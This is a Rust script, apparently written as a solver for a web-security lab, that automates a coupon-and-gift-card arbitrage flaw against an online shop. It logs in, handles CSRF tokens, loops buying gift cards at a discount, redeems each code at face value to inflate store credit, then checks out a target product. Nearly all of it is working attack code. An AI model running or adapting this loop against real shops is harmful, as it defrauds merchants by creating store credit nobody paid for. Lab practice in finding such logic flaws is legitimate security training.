#!/usr/bin/env rust-script
//! name: money_loop
//! description: Drive a coupon-vs-redeemable arbitrage loop on a shop target - log in, repeatedly buy the discounted redeemable product, redeem every code at face value, then buy the goal product; one envelope carries the credit curve and the final order.
//! version: 1.1.0
//! args: <base-url> <username> <password> --coupon CODE --gift-product N --price N --target N --target-product N [--max-qty N] [--cycles N]
//! keywords: logic, flaw, shop, gift-card, coupon, money, loop, ecommerce, arbitrage
//!
//! ```cargo
//! [dependencies]
//! ureq = { version = "2" }
//! ```

use pi_rust_lib::serde_json::{json, Value};
use std::collections::BTreeMap;
use std::time::Duration;

struct Client {
    agent: ureq::Agent,
    base: String,
    jar: BTreeMap<String, String>,
}

impl Client {
    fn new(base: String) -> Self {
        Client {
            agent: ureq::AgentBuilder::new().timeout(Duration::from_secs(30)).redirects(0).build(),
            base,
            jar: BTreeMap::new(),
        }
    }

    fn send(&mut self, method: &str, path: &str, form: Option<Vec<(&str, String)>>) -> Result<(u16, String, String), String> {
        let url = format!("{}{}", self.base, path);
        let body = form.map(|f| f.iter().map(|(k, v)| format!("{}={}", enc(k), enc(v))).collect::<Vec<_>>().join("&"));
        let mut last_err = String::new();
        for attempt in 0..4 {
            if attempt > 0 {
                std::thread::sleep(Duration::from_millis(400));
            }
            let cookie = self.jar.iter().map(|(k, v)| format!("{k}={v}")).collect::<Vec<_>>().join("; ");
            let mut req = self.agent.request(method, &url);
            if !cookie.is_empty() {
                req = req.set("Cookie", &cookie);
            }
            let result = match &body {
                Some(b) => req.set("Content-Type", "application/x-www-form-urlencoded").send_string(b),
                None => req.call(),
            };
            match result {
                Ok(r) => return Ok(self.finish(r)),
                Err(ureq::Error::Status(_, r)) => return Ok(self.finish(r)),
                Err(e) => last_err = format!("{e}"),
            }
        }
        Err(format!("{method} {path}: {last_err}"))
    }

    fn finish(&mut self, r: ureq::Response) -> (u16, String, String) {
        let status = r.status();
        let location = r.header("Location").unwrap_or("").to_string();
        for c in r.all("Set-Cookie") {
            if let Some((kv, _)) = c.split_once(';') {
                if let Some((k, v)) = kv.split_once('=') {
                    self.jar.insert(k.trim().to_string(), v.trim().to_string());
                }
            }
        }
        (status, location, r.into_string().unwrap_or_default())
    }
}

fn enc(s: &str) -> String {
    let mut out = String::new();
    for b in s.bytes() {
        match b {
            b'A'..=b'Z' | b'a'..=b'z' | b'0'..=b'9' | b'-' | b'_' | b'.' | b'~' => out.push(b as char),
            b' ' => out.push('+'),
            _ => out.push_str(&format!("%{b:02X}")),
        }
    }
    out
}

fn csrf(html: &str) -> Option<String> {
    let needle = "name=\"csrf\" value=\"";
    let i = html.find(needle)? + needle.len();
    let rest = &html[i..];
    let j = rest.find('"')?;
    Some(rest[..j].to_string())
}

fn money_after(html: &str, needle: &str) -> Option<f64> {
    let i = html.find(needle)? + needle.len();
    let rest = &html[i..];
    let end = rest.find(|c: char| !(c.is_ascii_digit() || c == '.' || c == ',')).unwrap_or(rest.len());
    rest[..end].replace(',', "").parse().ok()
}

/// The discounted total on /cart is the last "<th>$X</th>" of the totals table.
fn cart_total(html: &str) -> Option<f64> {
    let i = html.find("<th>Total:</th>")?;
    money_after(&html[i..], "<th>$")
}

fn codes(html: &str) -> Vec<String> {
    let start = html.find("bought the following gift cards").unwrap_or(0);
    let rest = &html[start..];
    let mut out = Vec::new();
    for part in rest.split("<td>").skip(1) {
        if let Some(end) = part.find("</td>") {
            let v = part[..end].trim();
            if v.len() == 10 && v.chars().all(|c| c.is_ascii_alphanumeric()) {
                out.push(v.to_string());
            }
        }
    }
    out
}

fn main() {
    let args: Vec<String> = std::env::args().skip(1).collect();
    let mut base = String::new();
    let mut user = String::new();
    let mut pass = String::new();
    let mut coupon = String::new();
    let mut gift_product: u32 = 0;
    let mut price = 0.0f64;
    let mut target = 0.0f64;
    let mut max_qty: i64 = 99;
    let mut max_cycles: u32 = 12;
    let mut jacket_product: u32 = 0;

    let mut i = 0;
    while i < args.len() {
        match args[i].as_str() {
            "--coupon" => { i += 1; coupon = args[i].clone(); }
            "--gift-product" => { i += 1; gift_product = args[i].parse().unwrap_or(gift_product); }
            "--price" => { i += 1; price = args[i].parse().unwrap_or(price); }
            "--target" => { i += 1; target = args[i].parse().unwrap_or(target); }
            "--max-qty" => { i += 1; max_qty = args[i].parse().unwrap_or(max_qty); }
            "--cycles" => { i += 1; max_cycles = args[i].parse().unwrap_or(max_cycles); }
            "--jacket-product" | "--target-product" => { i += 1; jacket_product = args[i].parse().unwrap_or(jacket_product); }
            other if base.is_empty() => base = other.trim_end_matches('/').to_string(),
            other if user.is_empty() => user = other.to_string(),
            other if pass.is_empty() => pass = other.to_string(),
            _ => {}
        }
        i += 1;
    }
    if base.is_empty() || user.is_empty() || pass.is_empty() {
        pi_rust_lib::report::failure("money_loop", "usage: money_loop <base-url> <user> <pass> --coupon CODE --gift-product N --price N --target N --target-product N", "pass the instance URL and the account credentials");
        std::process::exit(2);
    }
    if coupon.is_empty() || gift_product == 0 || jacket_product == 0 || price <= 0.0 || target <= 0.0 {
        pi_rust_lib::report::failure("money_loop", "lab-shaped values are required, not defaulted", "pass --coupon (the discount code), --gift-product and --target-product (product ids), --price (redeemable face value) and --target (goal cost) explicitly");
        std::process::exit(2);
    }

    match run(base, user, pass, coupon, gift_product, price, target, max_qty, max_cycles, jacket_product) {
        Ok(payload) => pi_rust_lib::report::success("money_loop", payload, "check final_credit and the goal-product order").unwrap_or(()),
        Err(e) => {
            pi_rust_lib::report::failure("money_loop", &e, "rerun after checking the session and coupon");
            std::process::exit(1);
        }
    }
}

#[allow(clippy::too_many_arguments)]
fn run(base: String, user: String, pass: String, coupon: String, gift_product: u32, price: f64, target: f64, max_qty: i64, max_cycles: u32, jacket_product: u32) -> Result<Value, String> {
    let mut c = Client::new(base.clone());
    let (_, _, login_page) = c.send("GET", "/login", None)?;
    let tok = csrf(&login_page).ok_or("no csrf on /login")?;
    let (status, _, _) = c.send("POST", "/login", Some(vec![("csrf", tok), ("username", user.clone()), ("password", pass)]))?;
    if status != 302 {
        return Err(format!("login failed with status {status}"));
    }

    let account = format!("/my-account?id={user}");
    let (_, _, page) = c.send("GET", &account, None)?;
    let mut credit = money_after(&page, "Store credit: $").ok_or("no store credit on /my-account")?;

    let mut curve: Vec<Value> = vec![json!({"cycle": 0, "quantity": 0, "credit": credit})];
    let mut redeemed = 0usize;
    let mut cycles_done = 0u32;

    while credit < target && cycles_done < max_cycles {
        // Buy as many gift cards as the current credit covers at the discounted price.
        let affordable = (credit / (price * 0.7)).floor() as i64;
        let qty = affordable.clamp(1, max_qty);
        c.send("POST", "/cart", Some(vec![("productId", gift_product.to_string()), ("redir", "CART".to_string()), ("quantity", qty.to_string())]))?;
        let (_, _, cart) = c.send("GET", "/cart", None)?;
        let tok = csrf(&cart).ok_or("no csrf on /cart")?;
        c.send("POST", "/cart/coupon", Some(vec![("csrf", tok.clone()), ("coupon", coupon.clone())]))?;
        let (_, _, cart) = c.send("GET", "/cart", None)?;
        let tok = csrf(&cart).ok_or("no csrf on discounted /cart")?;
        let due = cart_total(&cart).unwrap_or(f64::MAX);
        if due > credit {
            return Err(format!("discounted total {due} exceeds credit {credit} at qty {qty}"));
        }
        c.send("POST", "/cart/checkout", Some(vec![("csrf", tok)]))?;
        let (_, _, order) = c.send("GET", "/cart/order-confirmation?order-confirmed=true", None)?;
        let bought = codes(&order);
        if bought.is_empty() {
            return Err(format!("no gift card codes on the order confirmation at qty {qty}"));
        }
        let (_, _, page) = c.send("GET", &account, None)?;
        let tok = csrf(&page).ok_or("no csrf for redemption")?;
        for code in &bought {
            std::thread::sleep(Duration::from_millis(60));
            c.send("POST", "/gift-card", Some(vec![("csrf", tok.clone()), ("gift-card", code.clone())]))?;
        }
        redeemed += bought.len();
        let (_, _, page) = c.send("GET", &account, None)?;
        credit = money_after(&page, "Store credit: $").unwrap_or(credit);
        cycles_done += 1;
        curve.push(json!({"cycle": cycles_done, "quantity": qty, "paid": due, "codes": bought.len(), "credit": credit}));
    }

    // Spend the credit on the target item.
    let mut order_status;
    c.send("POST", "/cart", Some(vec![("productId", jacket_product.to_string()), ("redir", "CART".to_string()), ("quantity", "1".to_string())]))?;
    let (_, _, cart) = c.send("GET", "/cart", None)?;
    let tok = csrf(&cart).ok_or("no csrf on jacket cart")?;
    c.send("POST", "/cart/coupon", Some(vec![("csrf", tok.clone()), ("coupon", coupon.clone())]))?;
    let (_, _, cart) = c.send("GET", "/cart", None)?;
    let due = cart_total(&cart).unwrap_or(f64::MAX);
    if due <= credit {
        let tok = csrf(&cart).ok_or("no csrf for jacket checkout")?;
        let (status, location, _) = c.send("POST", "/cart/checkout", Some(vec![("csrf", tok)]))?;
        order_status = format!("checkout={status} location={location}");
        let (_, _, confirm) = c.send("GET", "/cart/order-confirmation?order-confirmed=true", None)?;
        if !confirm.is_empty() {
            order_status.push_str(" confirm-page-rendered");
        }
        let (_, _, page) = c.send("GET", &account, None)?;
        credit = money_after(&page, "Store credit: $").unwrap_or(credit);
    } else {
        order_status = format!("insufficient credit: due {due}, credit {credit}");
    }

    Ok(json!({
        "base": base,
        "target": target,
        "final_credit": credit,
        "cycles": cycles_done,
        "codes_redeemed": redeemed,
        "curve": curve,
        "jacket": {"product": jacket_product, "due": due, "status": order_status},
    }))
}
